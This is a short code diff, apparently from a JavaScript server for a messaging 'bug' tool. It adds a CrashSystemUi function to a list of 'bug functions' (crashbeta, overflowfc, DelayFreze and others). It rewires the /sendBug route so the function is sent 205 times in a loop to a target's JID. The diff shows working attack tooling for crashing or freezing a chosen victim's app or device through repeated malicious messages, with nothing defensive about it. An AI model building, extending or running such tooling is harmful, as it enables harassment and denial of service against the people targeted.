@@ -11,6 +11,7 @@ const {
   // Bug functions
   bleng,
   DelayFreze,
+  CrashSystemUi,
   crashbeta,
   overflowfc,
   blankmsg,
@@ -325,12 +326,10 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
 
-        case "bleng":
+        case "CrashSystemUi":
           for (let i = 0; i < 205; i++) {
-            await bleng(sock, targetJid);
+            await CrashSystemUi(sock, targetJid);
             await sleep(1200);
-            await AhhCrot(sock, targetJid);
-            await sleep(1500);
           }
           break;
 
